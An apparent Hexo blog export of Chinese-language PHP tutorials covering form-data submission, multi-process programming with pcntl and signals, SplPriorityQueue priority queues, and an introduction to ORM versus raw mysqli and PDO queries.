<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundary63FiWN3UoYxd8OT6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;UploadFile&quot;; filename&#x3D;&quot;QQ截图20170925101502.png&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary63FiWN3UoYxd8OT6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;sid&quot;</span><br><span class="line"></span><br><span class="line">sid</span><br><span class="line">------WebKitFormBoundary63FiWN3UoYxd8OT6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fun&quot;</span><br><span class="line"></span><br><span class="line">add</span><br><span class="line">------WebKitFormBoundary63FiWN3UoYxd8OT6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;mode&quot;</span><br></pre></td></tr></table></figure>

<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>这几种方式功能上说没什么区别，都能实现数据的提交，大家选择自己喜欢的方式就行，最重要的是前后端协调好, 虽然这里后端是以PHP为例，但是其他语言也是大同小异。最后，再说一下数组提交，这个倒不是新的提交方式，我这里是指遇到那种一个字段提交多个数据的情况，比如说删除多个文章，一般前端需要传多个id，举例子字段名字叫ids，一般有这2种方案：</p>
<h3 id="1-逗号相隔"><a href="#1-逗号相隔" class="headerlink" title="1. 逗号相隔"></a>1. 逗号相隔</h3><img src = "/images/old/3571187-5ca0c75d95ef56bb.png" />

<p>这样传参，后端获取到之后是一个字符串，在PHP里面可以用explode这样的函数去把字符串拆分成数组，非常方便，当然你也可以选择其他分隔符，比如说“-”，“+”等字符。</p>
<h3 id="2-JSON形式"><a href="#2-JSON形式" class="headerlink" title="2. JSON形式"></a>2. JSON形式</h3><p>这就是文中说的第二种方式，把id放在数组里面以json方式传到后台，这样后台可以直接获取到一个数组.</p>
<img src = "/images/old/3571187-8a85e131e56d62b8.png" />



]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP多进程编程应用</title>
    <url>/2017/coding/php/php-multi-process.html</url>
    <content><![CDATA[<p>在日常开发中，我们经常会遇到需要使用脚本处理一些数据，在数据量比较大的情况下，我们可以采用并行的方式处理，比如说：</p>
<h2 id="1-启动多个实例"><a href="#1-启动多个实例" class="headerlink" title="1.启动多个实例"></a>1.启动多个实例</h2><p>这种方式简单实用，推荐，比如说使用下面的shell脚本我们就可以轻松的启动多个进程去处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">  </span><br><span class="line">for((i&#x3D;1;i&lt;&#x3D;8;i++))</span><br><span class="line">do   </span><br><span class="line">    &#x2F;usr&#x2F;bin&#x2F;php multiprocessTest.php &amp;</span><br><span class="line">done</span><br><span class="line">  </span><br><span class="line">wait</span><br></pre></td></tr></table></figure>
<p>但是这种方式依赖外部工具，不够灵活！其实我们也可以采用多进程|多线程的方式</p>
<a id="more"></a>

<p>PHP提供了大量关于进程相关的扩展，大部分都是和linux系统编程相关，我觉得应该就是对C库api的调用，文档也基本上没写，如果想用好估计得对linux系统下C编程非常熟悉！</p>
<p>其中pthreads是多线程需要用到的，多进程会用到pcntl和posix扩展，这篇文章就是简单介绍一下这两个扩展的应用。</p>
<h2 id="2-启用多进程"><a href="#2-启用多进程" class="headerlink" title="2.启用多进程"></a>2.启用多进程</h2><p>php多进程需要pcntl和posix扩展支持，可以通过 php -m 查看是否安装，需要注意的是目前多进程实现只能在cli模式下使用，虽然是个残废，不妨也了解一下，具体的API可以查看官方文档，这里先举个简单的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">foreach (range(1, 5) as $index) &#123;</span><br><span class="line">    $pid &#x3D; pcntl_fork();</span><br><span class="line">    if ($pid &#x3D;&#x3D;&#x3D; -1) &#123;</span><br><span class="line">        echo &quot;failed to fork!\n&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125; elseif ($pid) &#123;</span><br><span class="line">        $pid &#x3D; posix_getpid();</span><br><span class="line">        pcntl_wait($status); &#x2F;&#x2F;父进程必须等待一个子进程退出后，再创建下一个子进程。</span><br><span class="line">        echo &quot;I am the parent, pid: $pid\n&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $cid &#x3D; posix_getpid();</span><br><span class="line">        echo &quot;fork the &#123;$index&#125;th child, pid: $cid\n&quot;;</span><br><span class="line">        exit; &#x2F;&#x2F;必须</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个例子很简单，循环了5次，在每次循环的时候创建一个进程，然后打印一句话</p>
<p>主要使用的方法就是函数 pcntl_fork()，一次调用两次返回，在父进程中返回子进程pid，在子进程中返回0，出错返回-1</p>
<p>posix_getpid()函数是返回当前进程 id，pcntl_wait()是等待或返回fork的子进程状态，pcntl_wait()将会存储状态信息到status 参数上，这个通过status参数返回的状态信息可以通过其它函数获得。</p>
<p>其中执行结果如下，在不同的机器是pid不一样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I am the parent, pid: 11183</span><br><span class="line">fork the 1th child, pid: 11184</span><br><span class="line">I am the parent, pid: 11183</span><br><span class="line">fork the 2th child, pid: 11185</span><br><span class="line">I am the parent, pid: 11183</span><br><span class="line">I am the parent, pid: 11183</span><br><span class="line">I am the parent, pid: 11183</span><br><span class="line">fork the 3th child, pid: 11186</span><br><span class="line">fork the 5th child, pid: 11188</span><br><span class="line">fork the 4th child, pid: 11187</span><br></pre></td></tr></table></figure>

<p><strong>第一个注意点</strong>:</p>
<p>如果是在循环中创建子进程,那么子进程中最后要exit,防止子进程进入循环!</p>
<p><strong>第二个注意点</strong>:</p>
<p>这个和go的协程有点类型，主进程必须等待子进程执行完任务, 如果你不等待，你会发现一个是执行的顺序不固定，第二个打印的记录会少于10条，原因很简单，子进程还没来得及打印就结束了。</p>
<p>有一个简单方法是使用 pcntl_wait()，但是你会发现上面这个例子完全变成并行了…上面的结果就是，无论你运行多少次，每次都是按照1到5的顺序打印，这和我们多进程的所要实现的效果有点差异，我们需要的应该是1和5并行！</p>
<p>下面这种写法就可以实现这种效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$ids &#x3D; [];</span><br><span class="line"> </span><br><span class="line">foreach (range(1, 5) as $index) &#123;</span><br><span class="line">    $ids[] &#x3D; $pid &#x3D; pcntl_fork();</span><br><span class="line">    if ($pid &#x3D;&#x3D;&#x3D; -1) &#123;</span><br><span class="line">        echo &quot;failed to fork!\n&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125; elseif ($pid) &#123;</span><br><span class="line">        $pid &#x3D; posix_getpid();</span><br><span class="line">        echo &quot;I am the parent, pid: $pid\n&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $cid &#x3D; posix_getpid();</span><br><span class="line">        echo &quot;fork the &#123;$index&#125;th child, pid: $cid\n&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">foreach ($ids as $i &#x3D;&gt; $pid) &#123;</span><br><span class="line">    if ($pid) &#123;</span><br><span class="line">        pcntl_waitpid($pid, $status);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">结果如下：</span><br><span class="line">fork the 1th child, pid: 8392</span><br><span class="line">I am the parent, pid: 8390</span><br><span class="line">I am the parent, pid: 8390</span><br><span class="line">fork the 2th child, pid: 8393</span><br><span class="line">I am the parent, pid: 8390</span><br><span class="line">I am the parent, pid: 8390</span><br><span class="line">I am the parent, pid: 8390</span><br><span class="line">fork the 3th child, pid: 8394</span><br><span class="line">fork the 4th child, pid: 8395</span><br><span class="line">fork the 5th child, pid: 8396</span><br></pre></td></tr></table></figure>

<p>多次运行你会发现，每次的打印顺序都不一样，这就说明了1到5是并行执行的，也就是实现了多进程的效果！</p>
<p>其中pcntl_waitpid() 作用是等待或返回fork的子进程状态，挂起当前进程的执行直到参数pid指定的进程号的进程退出， 或接收到一个信号要求中断当前进程或调用一个信号处理函数</p>
<p>在这段代码里面，我们提前准备了一个数组存放这些子进程的pid，然后使用一个循环不停的查询其状态等待其结束！倘若你在上面的代码里面在子进程里面加一个随机的sleep，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cid &#x3D; posix_getpid();</span><br><span class="line">$t &#x3D; random_int(1,20);</span><br><span class="line">sleep($t);</span><br><span class="line">echo &quot;fork the &#123;$index&#125;th child, pid: $cid, wait: $t\n&quot;;</span><br><span class="line">exit;</span><br><span class="line">然后运行结果如下：</span><br><span class="line"></span><br><span class="line">I am the parent, pid: 8772</span><br><span class="line">I am the parent, pid: 8772</span><br><span class="line">I am the parent, pid: 8772</span><br><span class="line">I am the parent, pid: 8772</span><br><span class="line">I am the parent, pid: 8772</span><br><span class="line">fork the 1th child, pid: 8773, wait: 1</span><br><span class="line">fork the 4th child, pid: 8776, wait: 5</span><br><span class="line">fork the 3th child, pid: 8775, wait: 14</span><br><span class="line">fork the 2th child, pid: 8774, wait: 16</span><br><span class="line">fork the 5th child, pid: 8777, wait: 18</span><br></pre></td></tr></table></figure>

<h2 id="3-父进程和子进程之间关系？"><a href="#3-父进程和子进程之间关系？" class="headerlink" title="3.父进程和子进程之间关系？"></a>3.父进程和子进程之间关系？</h2><p>子进程是复制了父进程的代码和内存空间，这意味着如果你在父进程里面定义了一些变量，在子进程里面也是可以操作访问的，这同时也意味着如果多个子进程操作同一个变量必然会出现覆盖和争用问题</p>
<p>比如说同时修改一个变量、同时往一个文件写入内容，需要通过锁机制保证同一时刻只能有一个进程操作。</p>
<p>还有一些坑，假如你在父进程去实例化一个mysql连接，在多个子进程里面同时使用，也会出现争用问题，所以涉及到这类资源类的变量，务必在各个子进程内部单独创建！</p>
<h2 id="4-进程信号"><a href="#4-进程信号" class="headerlink" title="4.进程信号"></a>4.进程信号</h2><p>进程信号也是linux操作系统的一些概念，这里就说说在PHP里面关于信号的一个应用</p>
<p>有些项目里面有时候会用到一些脚本，比如处理redis队列的脚本，通常的做法是写一个while循环从队列里面不停的取出数据处理，为了防止内存泄露或者进程假死，一般都会定时的重启脚本，通过做法就是先终止脚本再启动脚本，但是做的不好可能会导致数据丢失</p>
<p>举个例子，假如你这个脚本刚好从redis取出一条数据，然后正在处理中，操作还未完成，你突然终止脚本，那这个数据就丢失了。</p>
<p>使用信号注册我们可以更加优雅的重启或者终止脚本，你可以称之为平滑重启！看一下下面的代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;ctrl+c</span><br><span class="line">pcntl_signal(SIGINT, function () &#123;</span><br><span class="line">    fwrite(STDOUT, &quot;receive signal: &quot; . SIGINT . &quot; do nothing ...\n&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;kill</span><br><span class="line">pcntl_signal(SIGTERM, function () &#123;</span><br><span class="line">    fwrite(STDOUT, &quot;receive signal: &quot; . SIGTERM . &quot; I will exit!\n&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">while (true) &#123;</span><br><span class="line">    pcntl_signal_dispatch();</span><br><span class="line">    echo &quot;do something。。。\n&quot;;</span><br><span class="line">    sleep(5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Linux进程信号分为很多种，PHP里面定义了43种，咱就说说常用的几种：</p>
<p>SIGINT 2 这个其实相对于 ctrl+c</p>
<p>SIGTERM 15 就是 kill 默认的参数，表示终止进程</p>
<p>SIGKILL 9 就是 kill -9, 表示立马终止，这个信号在PHP里面是无法注册的</p>
<p>所谓注册信号就是接管系统对这个信号的处理方式，如果你不注册这个信号，进程就会按照默认方式去处理这个信号，如果你在代码里面注册这个信号，你就可以自定义处理方式，比如说在脚本里面先处理完当前数据，然后再退出！</p>
<p>看明白了这个就可以读懂上面的例子了，其中 pcntl_signal 是注册信号处理handler，第一个参数是你需要注册的信号，第二个是处理操作，可以是匿名函数或者一个函数名，可以注册多个信号</p>
<p>pcntl_signal_dispatch 调用每个等待信号通过pcntl_signal() 安装的处理器。早期PHP还有一种写法是使用 ticks，性能非常差，php5.3之后建议都使用 pcntl_signal_dispatch。</p>
<p>说明一下：pcntl_signal()函数仅仅是注册信号和它的处理方法，真正接收到信号并调用其处理方法的是pcntl_signal_dispatch()函数必须在循环里调用，为了检测是否有新的信号等待dispatching。</p>
<h2 id="5-应用场景"><a href="#5-应用场景" class="headerlink" title="5.应用场景"></a>5.应用场景</h2><p>由于进程的系统开销还是比较大，一般不太适合拿来做大规模并发程序，使用线程或者协程可能更好，拿来写个3-5个进程的后台脚本倒是有点用！比如说写个爬虫同时爬取多个网站的数据！举个例子：</p>
<pre><code>&lt;?php
$urls = [
    &apos;https://www.baidu.com&apos;,
    &quot;https://www.mi.com&quot;,
    &quot;https://www.qingyidai.com&quot;
];

$ids = [];

foreach ($urls as $url) {
    $ids[] = $pid = pcntl_fork();
    if ($pid === -1) {
        echo &quot;failed to fork!\n&quot;;
        exit;
    } elseif ($pid) {
    } else {
        echo &quot;start get url: &quot;.$url.&quot;\n&quot;;
        crawler($url);
        exit;
    }
}

//爬取网页，取出网页标题
function crawler($url)
{
    $content = file_get_contents($url);

    preg_match(&quot;/&lt;title&gt;(.*)&lt;\/title&gt;/&quot;, $content, $matches);

    echo $matches[1].&quot;\n&quot;;
}

foreach ($ids as $i =&gt; $pid) {
    if ($pid) {
        pcntl_waitpid($pid, $status);
    }
}

运行结果如下：
start get url: https://www.baidu.com
start get url: https://www.mi.com
start get url: https://www.qingyidai.com
轻易贷 - 开元金融旗下品牌_网络借贷信息中介服务平台
百度一下，你就知道
小米商城 - 小米9、小米MIX 3、红米Note 7，小米电视官方网站</code></pre><p>当你执行这个脚本的时候，假如你在爬取的方法里面加一个sleep，这时候你在终端里面使用ps，你会看到4个进程，其中一个是父进程，其它3个是启动的子进程</p>
<p>感兴趣的可以再看看PHP的官方文档，上面提供了非常丰富的函数！<a href="https://www.php.net/manual/zh/book.pcntl.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/book.pcntl.php</a> 和 <a href="https://www.php.net/manual/zh/book.posix.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/book.posix.php</a></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP优先队列</title>
    <url>/2017/coding/php/php-priority-queue.html</url>
    <content><![CDATA[<h2 id="1-什么是优先队列？"><a href="#1-什么是优先队列？" class="headerlink" title="1.什么是优先队列？"></a>1.什么是优先队列？</h2><p>队列大家应该都很熟悉，专业的说队列是一种特殊的线性表，简单的说就是先进先出（FIFO），与队列相反的还有一种数据结构叫作栈，先进后出（FILO），这里的栈和内存里面的栈没啥关系，不要理解错了！</p>
<p>队列在开发的应用挺多的，最广泛的就是消息队列，用来处理一些任务比如下单，抢购，需要按请求的时间排序，先来的先处理，关键是保持一种顺序结构。实际开发中，我们一般很少自己去实现队列，通常都是使用一些现成的服务，比如redis queue，rabbitmq。</p>
<p>优先队列（Priprity Queue），顾名思义，就是带有优先级的队列，也就是说不是按请求的顺序排序，而且根据某一些规则属性。举个例子：有一些12306的刷票软件，花钱买了加速包抢到票的几率更高。这里所谓几率更高换个说法就是优先级更高，如果只有10张票，肯定是先让那些花了钱的先抢到票，没花钱的话排后面。</p>
<a id="more"></a>

<h2 id="2-为什么需要优先队列？"><a href="#2-为什么需要优先队列？" class="headerlink" title="2.为什么需要优先队列？"></a>2.为什么需要优先队列？</h2><p>假设现在有10000个人抢票，其中有50个人交了数目不一的钱，当系统抢到一张票后需要按照这些用户交钱的数目从大到小排序依次分配。如果让你去实现上面所说的抢票优先级，你会怎么设计呢？</p>
<h3 id="做法一："><a href="#做法一：" class="headerlink" title="做法一："></a>做法一：</h3><p>如果这些用户信息是存储到数据库里面，当每次抢到一张票的时候，使用sql语句排序取出符合条件的用户里面交钱最多的那位就行了。如果不是存储到数据库里面的，可能就需要在内存里面排序了，1万个用户信息虽然不多，但是你每次都需要重新排序。</p>
<h3 id="做法二："><a href="#做法二：" class="headerlink" title="做法二："></a>做法二：</h3><p>使用redis sorted set 实现，Redis 有序集合和集合一样也是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数，redis正是通过分数来为集合中的成员进行从小到大的排序，有序集合的成员是唯一的,但分数(score)却可以重复。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sorted set 操作</span><br><span class="line">ZADD：向 sorted set 中添加元素</span><br><span class="line">ZCOUNT： sorted set 中 score 等于指定值的元素有多少个</span><br><span class="line">ZSCORE：sorted set 中指定元素的 score 是多少</span><br><span class="line">ZCARD： sorted set 中总共有多少个元素</span><br><span class="line">ZREM：删除 sorted set 中的指定元素</span><br><span class="line">ZREVRANGE：按照从大到小的顺序返回指定索引区间内的元素</span><br><span class="line">ZRANGE: 按照从小到大的顺序返回指定索引区间内的元素</span><br></pre></td></tr></table></figure>
<p>值得一说的是，这个并不是并发安全的，因为取优先级最高的元素以及删除这个元素是两次操作，不是原子性的，不过可以使用lua脚本解决这个问题。</p>
<h3 id="做法三："><a href="#做法三：" class="headerlink" title="做法三："></a>做法三：</h3><p>使用优先队列，大部分编程语言的标准库里面都自带优先队列实现，并不需要自己去实现，不过像PHP这样的Web程序每次请求结束后内存数据都会被销毁，使用自己构建的优先队列还不如第二种做法好使，或者实现一个常驻进程的服务供Web调用。</p>
<h2 id="3-原理和使用"><a href="#3-原理和使用" class="headerlink" title="3.原理和使用"></a>3.原理和使用</h2><p>优先队列是基于二叉堆的，构建一个优先队列实际上就是在构建一个二叉堆，二叉堆是一种特殊的堆，二叉堆是完全二元树（二叉树）或者是近似完全二元树（二叉树）。</p>
<p>二叉堆有两种：最大堆和最小堆。最大堆：父结点的键值总是大于或等于任何一个子节点的键值；最小堆：父结点的键值总是小于或等于任何一个子节点的键值。</p>
<p>二叉树是每个结点最多有两个子树的树结构。</p>
<p>树是一种非线性的数据结构，是由n（n &gt;=0）个结点组成的有限集合。</p>
<blockquote>
<p>以上内容仅供参考，关于这些数据结构的实现和算法细节这里不说了，毕竟不简单，感兴趣的话可以详细了解一下。</p>
</blockquote>
<p>这些算法虽然不简单，但是毕竟我们都是站在巨人的肩膀上，下面看一下在PHP SPL里面提供的优先队列实现。PHP的标准库里面提供了常用的数据结构，比如链表，堆，栈，最大堆，最小堆，固定大小数组，其中就有优先队列，其类摘要如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SplPriorityQueue implements Iterator , Countable &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> __construct ( void )</span><br><span class="line">    <span class="keyword">public</span> int compare ( mixed $priority1 , mixed $priority2 )</span><br><span class="line">    <span class="keyword">public</span> int count ( void )</span><br><span class="line">    <span class="keyword">public</span> mixed current ( void )</span><br><span class="line">    <span class="keyword">public</span> mixed extract ( void )</span><br><span class="line">    <span class="keyword">public</span> int getExtractFlags ( void )</span><br><span class="line">    <span class="keyword">public</span> void insert ( mixed $value , mixed $priority )</span><br><span class="line">    <span class="keyword">public</span> bool isCorrupted ( void )</span><br><span class="line">    <span class="keyword">public</span> bool isEmpty ( void )</span><br><span class="line">    <span class="keyword">public</span> mixed key ( void )</span><br><span class="line">    <span class="keyword">public</span> void next ( void )</span><br><span class="line">    <span class="keyword">public</span> void recoverFromCorruption ( void )</span><br><span class="line">    <span class="keyword">public</span> void rewind ( void )</span><br><span class="line">    <span class="keyword">public</span> void setExtractFlags ( int $flags )</span><br><span class="line">    <span class="keyword">public</span> mixed top ( void )</span><br><span class="line">    <span class="keyword">public</span> bool valid ( void )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中常用的是compare，count，current，insert，next，rewind，valid等方法，用法也相对简单，下面看一个完整的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$queue = <span class="keyword">new</span> SplPriorityQueue();</span><br><span class="line"></span><br><span class="line">$queue-&gt;insert(<span class="string">"A"</span>, <span class="number">2</span>);</span><br><span class="line">$queue-&gt;insert(<span class="string">"B"</span>, <span class="number">17</span>);</span><br><span class="line">$queue-&gt;insert(<span class="string">"C"</span>, <span class="number">4</span>);</span><br><span class="line">$queue-&gt;insert(<span class="string">"D"</span>, <span class="number">10</span>);</span><br><span class="line">$queue-&gt;insert(<span class="string">"E"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取优先级最高的元素</span></span><br><span class="line"><span class="keyword">echo</span> $queue-&gt;top().<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按照优先级从大到小遍历所有元素</span></span><br><span class="line"><span class="keyword">while</span> ($queue-&gt;valid()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $queue-&gt;current().<span class="string">"\n"</span>;</span><br><span class="line">    $queue-&gt;next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认情况下，这个是按照数值大小排序的，但是如果排序比较的属性的并不是一个数值怎么办呢？比如说是对象，这时候可以采用下面的写法，我们可以新建一个类继承标准库的类，然后根据自己的规则重写compare的方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> <span class="keyword">extends</span> <span class="title">SplPriorityQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">compare</span><span class="params">($priority1, $priority2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($priority1-&gt;age === $priority2-&gt;age) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $priority1-&gt;age &lt; $priority2-&gt;age ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$queue = <span class="keyword">new</span> MyQueue();</span><br><span class="line"></span><br><span class="line">$queue-&gt;insert(<span class="string">"A"</span>, <span class="keyword">new</span> Person(<span class="number">2</span>));</span><br><span class="line">$queue-&gt;insert(<span class="string">"B"</span>, <span class="keyword">new</span> Person(<span class="number">17</span>));</span><br><span class="line">$queue-&gt;insert(<span class="string">"C"</span>, <span class="keyword">new</span> Person(<span class="number">4</span>));</span><br><span class="line">$queue-&gt;insert(<span class="string">"D"</span>, <span class="keyword">new</span> Person(<span class="number">10</span>));</span><br><span class="line">$queue-&gt;insert(<span class="string">"E"</span>, <span class="keyword">new</span> Person(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取优先级最高的元素</span></span><br><span class="line"><span class="keyword">echo</span> $queue-&gt;top() . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按照优先级从大到小遍历所有元素</span></span><br><span class="line"><span class="keyword">while</span> ($queue-&gt;valid()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $queue-&gt;current() . <span class="string">"\n"</span>;</span><br><span class="line">    $queue-&gt;next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大家看懂了吗？如果错误欢迎指正！</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Queue</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP开发中ORM的应用</title>
    <url>/2017/coding/php/php-orm.html</url>
    <content><![CDATA[<h2 id="1-什么是ORM？"><a href="#1-什么是ORM？" class="headerlink" title="1.什么是ORM？"></a>1.什么是ORM？</h2><blockquote>
<p>对象关系映射（Object Relational Mapping，简称ORM）模式是一种为了解决面向对象与关系数据库存在的互不匹配的现象的技术。简单的说，ORM是通过使用描述对象和数据库之间映射的元数据，将程序中的对象自动持久化到关系数据库中。</p>
</blockquote>
<p>ORM并不是PHP独有的东西，只要和数据库打交道的语言都可以使用ORM，比如Java Web三大框架里面Hibernate，还有Doctrine(PHP重量级的ORM) ，Eloquent（laravel框架默认ORM，也可以单独使用）。</p>
<a id="more"></a>

<p>ORM是完全采用面向对象的方式去操作数据库，不用去拼SQL，对于复杂的SQL，ORM也支持直接运行原生SQL，咱先回顾一下平时咱们都是怎么操作数据库？举个例子，现在有一个库blog，一张表article，大部分的时候都是这是方式：新建MySQL连接，然后执行数据库操作，需要手写SQL：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$connect = mysqli_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>, <span class="string">"blog"</span>, <span class="string">"3306"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"数据库连接失败！"</span>);</span><br><span class="line">$connect-&gt;set_charset(<span class="string">"utf8"</span>);</span><br><span class="line"></span><br><span class="line">$id = <span class="number">1</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM article WHERE id = $id"</span>;</span><br><span class="line">$query = mysqli_query($connect, $sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"数据库查询失败!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$assoc = $query-&gt;fetch_assoc();</span><br><span class="line">var_dump($assoc);</span><br></pre></td></tr></table></figure>
<p>上面的写法有一些缺点，有一种更好的方式是使用PDO，扩展性更强，而且可以使用预处理防止SQL注入:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $pdo = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=localhost;dbname=blog"</span>, <span class="string">"root"</span>, <span class="string">"123456"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $exception) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Connect Failed"</span> . $exception-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">$pdo-&gt;exec(<span class="string">"set names utf8"</span>);</span><br><span class="line"></span><br><span class="line">$id      = <span class="number">1</span>;</span><br><span class="line">$prepare = $pdo-&gt;prepare(<span class="string">"SELECT * FROM article WHERE id = ?"</span>);</span><br><span class="line">$prepare-&gt;execute(<span class="keyword">array</span>($id));</span><br><span class="line"><span class="keyword">while</span> ($row = $prepare-&gt;fetch()) &#123;</span><br><span class="line">    var_dump($row);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不过实际开发中，大家都是使用一些封装好的类和方法，比如laravel框架里面称之为查询构造器，我们可以使用这样方法去查询数据库：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$users = DB::table(<span class="string">'users'</span>)-&gt;get();</span><br><span class="line"></span><br><span class="line">$price = DB::table(<span class="string">'orders'</span>)-&gt;where(<span class="string">'finalized'</span>, <span class="number">1</span>)-&gt;avg(<span class="string">'price'</span>);</span><br><span class="line"></span><br><span class="line">$users = DB::table(<span class="string">'users'</span>)</span><br><span class="line">        -&gt;join(<span class="string">'contacts'</span>, <span class="string">'users.id'</span>, <span class="string">'='</span>, <span class="string">'contacts.user_id'</span>)</span><br><span class="line">        -&gt;join(<span class="string">'orders'</span>, <span class="string">'users.id'</span>, <span class="string">'='</span>, <span class="string">'orders.user_id'</span>)</span><br><span class="line">        -&gt;select(<span class="string">'users.*'</span>, <span class="string">'contacts.phone'</span>, <span class="string">'orders.price'</span>)</span><br><span class="line">        -&gt;get();</span><br><span class="line"></span><br><span class="line">$orders = DB::table(<span class="string">'orders'</span>)</span><br><span class="line">        -&gt;select(<span class="string">'department'</span>, DB::raw(<span class="string">'SUM(price) as total_sales'</span>))</span><br><span class="line">        -&gt;groupBy(<span class="string">'department'</span>)</span><br><span class="line">        -&gt;havingRaw(<span class="string">'SUM(price) &gt; 2500'</span>)</span><br><span class="line">        -&gt;get();</span><br></pre></td></tr></table></figure>
<p>还有比如说TP框架里面M方法，这些类和方法大大简化了查询操作，但本质上还是拼SQL，只不过调用的时候看起来更像面向对象，方便很多。</p>
<p>但是这些并不是真正意义上的ORM，最多只算得上是O(object)，它只是把数据库查询操作对象化了，但是没有解决对象之间的关系问题！</p>
<hr>
